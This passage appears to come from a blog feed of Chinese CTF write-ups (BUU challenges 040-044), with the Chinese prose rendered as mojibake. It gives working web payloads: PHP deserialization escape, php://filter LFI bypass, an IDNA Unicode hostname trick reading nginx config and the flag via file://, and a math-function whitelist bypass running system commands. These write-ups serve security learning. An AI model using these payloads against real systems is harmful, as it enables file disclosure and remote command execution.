2016]piapiapia</code>æ˜¯å˜é•¿çš„<br>è¿™é“é¢˜æ˜¯å˜çŸ­çš„è¿‡æ»¤çš„å­—æ›¿æ¢ä¸ºç©ºï¼Œä½†å‰é¢çš„æ•°å€¼ä»£è¡¨çš„é•¿åº¦æ˜¯ä¸å˜çš„ï¼Œä¼šç»§ç»­å‘åè¯»<br>è€Œä¸”ä¼ å…¥çš„SESSIONæ˜¯åºåˆ—åŒ–åçš„æ•°ç»„ï¼Œä»¥<code>&#125;</code>ç»“å°¾ï¼Œåé¢çš„ååºåˆ—åŒ–æ—¶ä¼šè¢«èˆå¼ƒï¼Œä¹Ÿå°±ç»•è¿‡äº†<code>$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);</code>        </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>payloadï¼š<code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:8:&quot;function&quot;;s:6:&quot;adminn&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code><br>è¿™ä¸ªpayloadè¿›å…¥å<code>$serialize_info</code>çš„è¾“å‡ºæ˜¯ï¼š<code>a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;ã€&quot;;s:8:&quot;function&quot;;s:70:&quot;aã€‘&quot;;s:8:&quot;function&quot;;s:6:&quot;adminn&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code><br>ã€ã€‘æ˜¯è‡ªå·±åŠ çš„ï¼Œè¿™ä¹‹é—´çš„æ˜¯24ä¸ªï¼Œè¢«è§†ä¸ºæ˜¯userçš„å€¼äº†<br><img src="https://ftp.bmp.ovh/imgs/2021/03/f64fe9e43e570e0c.png"><br>ç„¶åè¯»å–<code>/d0g3_fllllllag</code>å³å¯      </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜044</title>
    <link href="/2021/03/04/BUU044/"/>
    <url>/2021/03/04/BUU044/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[BSidesCF 2020]Had a bad day<br><img src="https://ftp.bmp.ovh/imgs/2021/03/f5f5f1cac583c37f.png">   </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>ç‚¹å‡»å…¶ä¸­ä¸€ä¸ªåä¼šå‡ºæ¥ä¸€å¼ å›¾ç‰‡ï¼Œè€Œä¸”URLå˜æˆ<code>http://3c2d7f7c-2f24-42ca-84de-dfa013335bf4.node3.buuoj.cn/index.php?category=woofers</code><br>æœ¬æ¥ä»¥ä¸ºæ˜¯SQLæ³¨å…¥ï¼ŒåŠ äº†ä¸ª<code>&#39;</code><br>å›æ˜¾ï¼š<img src="https://ftp.bmp.ovh/imgs/2021/03/d6e58884d2fe94c0.png"><br>æ˜¯æ–‡ä»¶åŒ…å«<br><code>php://filter/read=convert.base64-encode/source=flag.php</code><br>å›æ˜¾ï¼š<code>Sorry, we currently only support woofers and meowers.</code><br>è¯•ä¸€ä¸‹<code>index</code><br>æˆåŠŸè¯»å‡º    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$file = $_GET[<span class="hljs-string">&#x27;category&#x27;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($file))&#123;<span class="hljs-keyword">if</span>( strpos( $file, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || strpos( $file, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || strpos( $file, <span class="hljs-string">&quot;index&quot;</span>))&#123;<span class="hljs-keyword">include</span> ($file . <span class="hljs-string">&#x27;.php&#x27;</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>ç„¶åæ²¡æ‹›äº†<br>çœ‹äº†WP<br><code>ä¼ªåè®®åµŒå¥—</code>       </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>payloadï¼š<code>php://filter/read=convert.base64-encode/index/resource=flag</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜043</title>
    <link href="/2021/03/03/BUU043/"/>
    <url>/2021/03/03/BUU043/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[SUCTF 2019]Pythonginx<br><img src="https://ftp.bmp.ovh/imgs/2021/03/a959acc0f70a10c6.png">   </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>é¢˜ç›®ç»™äº†æºç ï¼š     </p><pre><code><pre><code class="hljs python"><span class="hljs-meta">        @app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUrl</span>():</span>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)    host = parse.urlparse(url).hostname    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span>    parts = <span class="hljs-built_in">list</span>(urlsplit(url))    host = parts[<span class="hljs-number">1</span>]    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 222 &quot;</span> + host    newhost = []    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)    <span class="hljs-comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span>    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]    host = parse.urlparse(finalUrl).hostname    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read()    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 333&quot;</span></code></pre></code></pre><p>å‰ä¸¤ä¸ªifä¸èƒ½ç­‰äº<code>suctf.cc</code>ï¼Œç¬¬ä¸‰ä¸ªifè¯»å–æ–‡ä»¶â€”-&gt;<code>file</code>åè®®<br>ç¬¬ä¸‰ä¸ªifè¦<code>host == &#39;suctf.cc&#39;</code><br>ä¸è¿‡ç¬¬ä¸‰ä¸ªå‰é¢è¿˜æœ‰ä¸ªdecode<br>æ‰€ä»¥å¯¹è¾“å…¥çš„åŠ å¯†å³å¯      </p><p>å·å¤§ä½¬çš„è„šæœ¬ï¼š       </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse,urlunsplit,urlsplit<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_unicode</span>():</span>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):        uni=<span class="hljs-built_in">chr</span>(x)        url=<span class="hljs-string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(uni)        <span class="hljs-keyword">try</span>:            <span class="hljs-keyword">if</span> getUrl(url):                print(<span class="hljs-string">&quot;str: &quot;</span>+uni+<span class="hljs-string">&#x27; unicode: \\u&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(x))[<span class="hljs-number">2</span>:])        <span class="hljs-keyword">except</span>:            <span class="hljs-keyword">pass</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUrl</span>(<span class="hljs-params">url</span>):</span>    url = url    host = parse.urlparse(url).hostname    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>    parts = <span class="hljs-built_in">list</span>(urlsplit(url))    host = parts[<span class="hljs-number">1</span>]    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>    newhost = []    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]    host = parse.urlparse(finalUrl).hostname    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:    get_unicode()</code></pre>//è¿è¡Œç»“æœ      str: â„‚ unicode: \u2102str: â„­ unicode: \u212dstr: â…­ unicode: \u216dstr: â…½ unicode: \u217dstr: â’¸ unicode: \u24b8str: â“’ unicode: \u24d2str: ï¼£ unicode: \uff23str: ï½ƒ unicode: \uff43</code></pre><p>æŠŠæœ€åä¸€ä¸ªcæ›¿æ¢å³å¯<br>é¢˜ç›®æç¤ºnginxï¼Œè¯»å–nginxçš„æ–‡ä»¶         </p><pre><code>é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginxä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.confç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.serviceæ¨¡å—ï¼š/usr/lisb64/nginx/modulesåº”ç”¨ç¨‹åºï¼š/usr/sbin/nginxç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/htmlæ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginxé…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š/usr/local/nginx/conf/nginx.conf     </code></pre><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>payloadï¼š<code>?url=file://suctf.câ…­/usr/local/nginx/conf/nginx.conf</code><br>ç„¶åè¯»å–flag<br>payload:<code>?url=file://suctf.câ…­/usr/fffffflag</code>     </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜042</title>
    <link href="/2021/03/02/BUU042/"/>
    <url>/2021/03/02/BUU042/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[0CTF 2016]piapiapia<br><img src="https://ftp.bmp.ovh/imgs/2021/03/c2d7bb4e15e7e536.png">    </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p><code>www.zip</code>æ³„éœ²<br><img src="https://ftp.bmp.ovh/imgs/2021/03/f14c9ff26da419bd.png"><br>ä¸»è¦åˆ©ç”¨ç‚¹ï¼š    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);&#125;$username = $_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>];$profile=$user-&gt;show_profile($username);<span class="hljs-keyword">if</span>($profile  == <span class="hljs-literal">null</span>) &#123;header(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);&#125;<span class="hljs-keyword">else</span> &#123;$profile = unserialize($profile);$phone = $profile[<span class="hljs-string">&#x27;phone&#x27;</span>];$email = $profile[<span class="hljs-string">&#x27;email&#x27;</span>];$nickname = $profile[<span class="hljs-string">&#x27;nickname&#x27;</span>];$photo = base64_encode(file_get_contents($profile[<span class="hljs-string">&#x27;photo&#x27;</span>]));<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p><code>file_get_contents</code><br>è¯»å–<code>config.php</code>      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$config[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;$config[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;$config[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;$config[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;$flag = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p><code>update.php</code>      </p><pre><code>```php&lt;?php    require_once(&#39;class.php&#39;);    if($_SESSION[&#39;username&#39;] == null) &#123;        die(&#39;Login First&#39;);        &#125;    if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;        $username = $_SESSION[&#39;username&#39;];        if(!preg_match(&#39;/^\d&#123;11&#125;$/&#39;, $_POST[&#39;phone&#39;]))            die(&#39;Invalid phone&#39;);        if(!preg_match(&#39;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#39;, $_POST[&#39;email&#39;]))            die(&#39;Invalid email&#39;);        if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)            die(&#39;Invalid nickname&#39;);        $file = $_FILES[&#39;photo&#39;];        if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)            die(&#39;Photo size error&#39;);        move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload/&#39; . md5($file[&#39;name&#39;]));        $profile[&#39;phone&#39;] = $_POST[&#39;phone&#39;];        $profile[&#39;email&#39;] = $_POST[&#39;email&#39;];        $profile[&#39;nickname&#39;] = $_POST[&#39;nickname&#39;];        $profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);        $user-&gt;update_profile($username, serialize($profile));        echo &#39;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#39;;    &#125;    else &#123;      </code></pre><p>æœ‰ä¸ª<code>serialize</code>åºåˆ—åŒ–<br><code>class.php</code>é‡Œçš„æ›¿æ¢å‡½æ•°      </p><pre><code>public function filter($string) &#123;    $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);    $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;    $string = preg_replace($escape, &#39;_&#39;, $string);    $safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);    $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;    return preg_replace($safe, &#39;hacker&#39;, $string);&#125;         </code></pre><p>whereæ›¿æ¢ä¸ºhackeräº”ä½å˜æˆäº†å…­ä½  </p><ul><li><p>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸      </p><pre><code>  a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:13:&quot;123456@qq.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/562bd805ee2353360acb87cf40a48b19&quot;;&#125;         //ç»“æœ         Array  (      [phone] =&gt; 12345678912      [email] =&gt; 123456@qq.com      [nickname] =&gt; 123      [photo] =&gt; upload/562bd805ee2353360acb87cf40a48b19  )</code></pre></li></ul><pre><code>    a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:13:&quot;123456@qq.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/562bd805ee2353360acb87cf40a48b19&quot;;&#125;          //ç»“æœ           Array    (        [phone] =&gt; 12345678912        [email] =&gt; 123456@qq.com        [nickname] =&gt; 123        [photo] =&gt; config.php    )        </code></pre><p><code>&#125;</code>æå‰å‡ºç°ï¼Œååºåˆ—åŒ–å°±ä¼šæå‰ç»“æŸ<br>æ›¿æ¢ä¼šå¤šä¸€ä½ï¼Œå¤šä½™çš„ä½ä¼šå°†åŸæ¥çš„æŒ¤å‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯åªä¼šæ ¹æ®å‰é¢çš„æ•°å€¼è§„å®šçš„å‡ ä½æ¥è¯»ï¼Œè¯»åˆ°è§„å®šçš„ä½æ•°ï¼Œè¿™ä¸€å—ååºåˆ—åŒ–å°±åœæ­¢äº†ï¼›è€Œå¤šä½™çš„é‚£éƒ¨åˆ†ä¼šè¢«è®¤ä¸ºæ˜¯ä¸‹ä¸€å—<br><code>;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>å°†è¿™ä¸€å—ä»nicknameé‡ŒæŒ¤å‡ºæ¥ï¼Œå°±æˆphotoé‡Œçš„äº†ï¼Œç„¶åå°±èƒ½è¯»å‡º<code>config.php</code>       </p><p>nicknameæœ‰é•¿åº¦é™åˆ¶å¯ä»¥ç”¨æ•°ç»„<br>æ•°ç»„çš„åºåˆ—åŒ–æ˜¯ä»¥<code>&#123;&#125;</code>æ‹¬ä½çš„<br>æ‰€ä»¥ä¸Šé¢çš„å‰é¢è¦åŠ ä¸€ä¸ª<code>&#125;</code>é—­åˆæ•°ç»„çš„åºåˆ—åŒ–<br><code>where*34&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>        </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>åœ¨<code>update.php</code>é‡Œä¸Šä¼ æŠ“åŒ…<br>æ”¹nicknameä¼ªæ•°ç»„å’Œå…¶å†…å®¹<br><img src="https://ftp.bmp.ovh/imgs/2021/03/ccbc2725f789e2d3.png">     </p><p>ç„¶ååœ¨<code>profile.php</code>å›¾ç‰‡çš„base64è§£ç å³å¯å¾—åˆ°flag        </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜041</title>
    <link href="/2021/03/01/BUU041/"/>
    <url>/2021/03/01/BUU041/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[CISCN 2019 åˆèµ›]Love Math<br>ä»£ç å®¡è®¡â€”â€“RCE      </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;    show_source(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-comment">//ä¾‹å­ c=20-1</span>    $content = $_GET[<span class="hljs-string">&#x27;c&#x27;</span>];    <span class="hljs-keyword">if</span> (strlen($content) &gt;= <span class="hljs-number">80</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);    &#125;    $blacklist = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];    <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) &#123;        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . $blackitem . <span class="hljs-string">&#x27;/m&#x27;</span>, $content)) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);        &#125;    &#125;    <span class="hljs-comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span>    $whitelist = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];    preg_match_all(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);      <span class="hljs-keyword">foreach</span> ($used_funcs[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> $func) &#123;        <span class="hljs-keyword">if</span> (!in_array($func, $whitelist)) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);        &#125;    &#125;    <span class="hljs-comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.$content.<span class="hljs-string">&#x27;;&#x27;</span>);&#125;</code></pre></code></pre><p>éœ€è¦ç”¨whitelistä¸­çš„å‡½æ•°æ„é€ å‘½ä»¤æ‰§è¡Œ     </p><ul><li>å‡ ä¸ªå‡½æ•°       <ol><li><code>base_convert</code>â€”-&gt;åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—      </li><li><code>hex2bin</code>â€”â€“&gt;è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²       </li><li><code>bin2hex</code>â€”â€“&gt;æŠŠåŒ…å«æ•°æ®çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶å€¼      </li><li><code>hexdec</code>â€”â€”&gt;åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶  </li><li><code>dechex</code>â€”â€”&gt;åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶     </li></ol></li></ul><p>æ‰€è¦æ„é€ çš„payloadï¼š<code>?c=$_GET[a]($_GET[b])</code>ç„¶åä¼ å…¥<code>&amp;a=system&amp;b=cat /flag</code><br>ä¸­æ‹¬å·å¯ä»¥ç”¨èŠ±æ‹¬å·æ›¿ä»£<br>èƒ½è½¬æˆå­—ç¬¦ä¸²çš„åªæœ‰hex2binäº†ï¼Œ<br>ç”¨<code>base_convert</code>ï¼Œåè¿›åˆ¶è½¬åŒ–ä¸ºä¸‰åå…­è¿›åˆ¶ï¼Œbase36ä¸­æœ‰å­—æ¯å’Œæ•°å­—        </p><pre><code>echo base_convert(&quot;hex2bin&quot;,36,10);      37907361743         </code></pre><p><code>bin2hex</code>å°†<code>_GET</code>è½¬ä¸ºåå…­è¿›åˆ¶,dechexè½¬ä¸ºåè¿›åˆ¶        </p><pre><code>echo hexdec(bin2hex(&#39;_GET&#39;));      1598506324      </code></pre><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>payloadï¼š<code>c=$pi=(base_convert(37907361743,10,36)(dechex(1598506324)));$$pi&#123;pi&#125;($$pi&#123;abs&#125;)&amp;pi=system&amp;abs=ls</code><br><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">MORE</a>      </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜040</title>
    <link href="/2021/02/28/BUU040/"/>
    <url>/2021/02/28/BUU040/</url>
    
